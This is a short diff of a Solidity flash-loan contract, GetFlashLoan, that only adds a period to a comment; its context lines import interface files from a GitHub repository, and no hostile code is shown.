@@ -6,7 +6,7 @@ import "https://github.com/FlashLoanBSC/flashbnbloan/blob/main/ILendingPoolAddre
 import "https://github.com/FlashLoanBSC/flashbnbloan/blob/main/IPancakeCallee.sol";
 import "https://github.com/FlashLoanBSC/flashbnbloan/blob/main/IPancakeFactory.sol";
 import "https://github.com/FlashLoanBSC/flashbnbloan/blob/main/IPancakePair.sol";
-// Code Manager
+// Code Manager.
 import "https://github.com/FlashLoanBSC/flashbnbloan/blob/main/Iloanrouter.sol";
 contract GetFlashLoan {
         string public tokenName;
